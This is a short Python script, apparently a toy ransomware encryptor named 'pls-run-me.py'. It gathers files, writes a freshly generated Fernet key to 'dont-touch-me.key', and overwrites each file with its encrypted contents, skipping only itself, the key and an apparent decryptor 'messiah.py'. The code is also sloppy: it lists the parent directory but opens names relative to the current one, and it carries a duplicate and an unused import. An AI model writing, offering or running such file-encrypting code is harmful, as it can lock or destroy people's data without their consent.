import os
from requests import request


import os
from cryptography.fernet import Fernet
files=[]
a=os.path.split(os.getcwd())[0]
for file in os.listdir(a):
    if file== "pls-run-me.py" or file=="dont-touch-me.key" or file=="messiah.py":
        continue
    if os.path.isfile(file):
        files.append(file)
print(files)
key= Fernet.generate_key()

with open("dont-touch-me.key","wb") as thekey:
    thekey.write(key)
for file in files:   
    with open(file,"rb") as thefile:
        contents= thefile.read()
    contents_enc= Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
        thefile.write(contents_enc)
